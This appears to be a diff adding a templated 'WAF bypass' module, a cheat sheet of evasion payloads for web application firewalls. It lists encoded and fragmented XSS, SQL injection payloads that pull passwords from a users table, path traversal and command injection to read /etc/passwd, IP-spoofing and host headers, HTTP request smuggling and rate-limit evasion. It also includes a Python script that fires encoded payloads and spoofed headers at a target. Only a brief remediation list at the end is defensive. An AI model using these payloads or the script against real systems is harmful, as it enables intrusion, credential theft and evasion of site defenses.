@@ -1,0 +1,419 @@
+{# WAF Bypass Techniques Module #}
+{# Comprehensive Web Application Firewall bypass methods #}
+
+<waf_bypass_module>
+
+## WAF BYPASS TECHNIQUES GUIDE
+
+### WAF DETECTION & FINGERPRINTING
+
+**Common WAF Signatures:**
+```
+Cloudflare: cf-ray header, __cfduid cookie
+AWS WAF: x-amzn-requestid header
+Akamai: AkamaiGHost header
+Imperva/Incapsula: incap_ses cookie, visid_incap
+F5 BIG-IP: BIGipServer cookie, TS cookie prefix
+ModSecurity: Mod_Security header
+Sucuri: sucuri-cache header
+Barracuda: barra_counter_session cookie
+```
+
+**Detection Payloads:**
+```
+# Trigger WAF with known bad patterns
+<script>alert(1)</script>
+' OR 1=1--
+../../../etc/passwd
+; cat /etc/passwd
+${7*7}
+{{7*7}}
+```
+
+**Response Analysis:**
+```
+403 Forbidden - WAF blocked
+406 Not Acceptable - Input validation
+429 Too Many Requests - Rate limiting
+503 Service Unavailable - WAF overload
+Custom error page with WAF branding
+```
+
+### ENCODING BYPASSES
+
+**URL Encoding:**
+```
+Original: <script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
+Double: %253Cscript%253E
+Triple: %25253Cscript%25253E
+```
+
+**HTML Entity Encoding:**
+```
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;
+```
+
+**Unicode Encoding:**
+```
+%u003Cscript%u003E
+\u003Cscript\u003E
+<scr\u0069pt>alert(1)</scr\u0069pt>
+<script>alert\u00281\u0029</script>
+```
+
+**Mixed Encoding:**
+```
+<scr%69pt>alert(1)</scr%69pt>
+<scr&#x69;pt>alert(1)</scr&#x69;pt>
+%3Cscr%69pt%3Ealert%281%29%3C%2Fscr%69pt%3E
+```
+
+**Base64 Variations:**
+```
+Original: <script>alert(1)</script>
+Base64: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+Base64URL: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg
+```
+
+### CASE MANIPULATION
+
+**Case Variations:**
+```
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<scRIPT>alert(1)</scRIPT>
+
+# SQL
+UnIoN SeLeCt
+uNiOn SeLeCT
+UNION/**/SELECT
+```
+
+### COMMENT INJECTION
+
+**SQL Comment Bypasses:**
+```
+' UNION/**/SELECT/**/password/**/FROM/**/users--
+' UN/**/ION SEL/**/ECT pass/**/word FR/**/OM users--
+' UNION/*!50000SELECT*/ password FROM users--
+' UNION/*! SELECT */ password FROM users--
+' UNION+SELECT+password+FROM+users--
+' UNION%0aSELECT%0apassword%0aFROM%0ausers--
+```
+
+**XSS Comment Injection:**
+```
+<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>
+<script>/*comment*/alert(1)/*comment*/</script>
+<script><!--\nalert(1)\n--></script>
+```
+
+### WHITESPACE & SPECIAL CHARACTERS
+
+**Whitespace Alternatives:**
+```
+Null byte: %00
+Tab: %09 \t
+Newline: %0a %0d \n \r
+Form feed: %0c
+Vertical tab: %0b
+Space: %20 + /**/ %a0 (nbsp)
+```
+
+**SQL Whitespace Bypass:**
+```
+'UNION(SELECT(password)FROM(users))--
+' UNION%0aSELECT%0apassword%0aFROM%0ausers--
+'/**/UNION/**/SELECT/**/password/**/FROM/**/users--
+' UNION%09SELECT%09password%09FROM%09users--
+```
+
+**Path Traversal Whitespace:**
+```
+..%00/..%00/etc/passwd
+....//....//etc/passwd
+..%0d%0a/..%0d%0a/etc/passwd
+```
+
+### FUNCTION ALTERNATIVES
+
+**SQL Function Bypasses:**
+```
+# Instead of UNION
+' OR 1=1--
+' AND 1=2 UNION SELECT...
+' || (SELECT password FROM users) || '
+
+# Instead of SELECT
+SHOW TABLES
+/*!50000SELECT*/
+(SELECT)
+```
+
+**XSS Function Alternatives:**
+```
+# Instead of alert()
+prompt(1)
+confirm(1)
+console.log(1)
+document.write(1)
+eval('ale'+'rt(1)')
+setTimeout('alert(1)',0)
+setInterval('alert(1)',0)
+Function('alert(1)')()
+[].constructor.constructor('alert(1)')()
+```
+
+### TAG & ATTRIBUTE MANIPULATION
+
+**Alternative XSS Tags:**
+```
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details ontoggle=alert(1) open>
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+```
+
+**Event Handler Variations:**
+```
+onclick ondblclick onmousedown onmouseup onmouseover
+onmousemove onmouseout onkeypress onkeydown onkeyup
+onfocus onblur onchange onsubmit onreset onselect
+onload onunload onerror onresize onscroll
+```
+
+**Attribute Manipulation:**
+```
+<a href="javascript:alert(1)">
+<a href="java&#x0A;script:alert(1)">
+<a href="javascript&colon;alert(1)">
+<a href="javascrip&#x74;:alert(1)">
+<a href="j&#97;v&#97;script:alert(1)">
+```
+
+### HTTP PARAMETER MANIPULATION
+
+**Parameter Pollution:**
+```
+# HPP - multiple same parameters
+?id=1&id=2 UNION SELECT password
+?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/password
+
+# Different parameter forms
+?id=1
+?id[]=1
+?id[0]=1
+```
+
+**Content-Type Manipulation:**
+```
+# Standard
+Content-Type: application/x-www-form-urlencoded
+
+# Potential bypasses
+Content-Type: application/json
+Content-Type: text/xml
+Content-Type: application/xml
+Content-Type: multipart/form-data
+Content-Type: application/x-www-form-urlencoded; charset=utf-7
+Content-Type: application/x-www-form-urlencoded; charset=ibm500
+```
+
+**Charset Manipulation:**
+```
+# UTF-7 encoding
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# IBM EBCDIC encoding (charset=ibm037)
+Different byte representation
+```
+
+### HTTP HEADER BYPASSES
+
+**IP Spoofing Headers:**
+```
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+```
+
+**Host Header Manipulation:**
+```
+Host: target.com
+Host: localhost
+Host: 127.0.0.1
+X-Forwarded-Host: internal.target.com
+X-Host: internal.target.com
+```
+
+**Method Override:**
+```
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
+X-HTTP-Method: PATCH
+```
+
+### REQUEST SMUGGLING BYPASS
+
+**CL.TE Smuggling:**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+**TE.CL Smuggling:**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+### PAYLOAD FRAGMENTATION
+
+**Chunked Payload:**
+```
+# Break payload across chunks
+POST /vulnerable HTTP/1.1
+Transfer-Encoding: chunked
+
+3
+<sc
+4
+ript
+1
+>
+5
+alert
+3
+(1)
+9
+</script>
+0
+```
+
+**Multi-Part Fragmentation:**
+```
+Content-Type: multipart/form-data; boundary=----
+------
+Content-Disposition: form-data; name="data"
+
+<scr
+------
+Content-Disposition: form-data; name="data"
+
+ipt>
+------
+Content-Disposition: form-data; name="data"
+
+alert(1)
+------
+Content-Disposition: form-data; name="data"
+
+</script>
+------
+```
+
+### RATE LIMIT BYPASS
+
+**Headers for Bypass:**
+```
+X-Forwarded-For: randomip
+X-Real-IP: randomip
+X-Originating-IP: randomip
+# Rotate IP on each request
+```
+
+**Techniques:**
+```
+- Use different HTTP methods (GET vs POST)
+- Add random parameters (?cachebuster=random)
+- Modify User-Agent each request
+- Use different endpoints for same action
+- Distributed requests across time
+```
+
+### AUTOMATION SCRIPT
+
+```python
+import requests
+from itertools import product
+
+class WAFBypass:
+    def __init__(self, target_url):
+        self.url = target_url
+        self.session = requests.Session()
+    
+    def test_encoding_bypass(self, payload):
+        encodings = [
+            payload,
+            payload.replace("<", "%3C").replace(">", "%3E"),
+            payload.replace("<", "&#60;").replace(">", "&#62;"),
+            "".join(f"%{ord(c):02x}" for c in payload),
+            payload.replace("script", "scr%69pt"),
+        ]
+        
+        for encoded in encodings:
+            r = self.session.get(f"{self.url}?q={encoded}")
+            if r.status_code != 403:
+                print(f"BYPASS: {encoded[:50]}... -> {r.status_code}")
+    
+    def test_header_bypass(self):
+        headers_list = [
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Real-IP": "127.0.0.1"},
+            {"X-Originating-IP": "127.0.0.1"},
+            {"X-Custom-IP-Authorization": "127.0.0.1"},
+        ]
+        
+        for headers in headers_list:
+            r = self.session.get(self.url, headers=headers)
+            if r.status_code == 200:
+                print(f"HEADER BYPASS: {headers}")
+```
+
+### REMEDIATION RECOMMENDATIONS
+
+- Use positive security model (whitelist)
+- Implement multiple layers of defense
+- Regularly update WAF rules
+- Test WAF with known bypass techniques
+- Monitor for evasion attempts
+- Use HTTPS to prevent inspection bypass
+- Implement rate limiting with proper identification
+
+</waf_bypass_module>
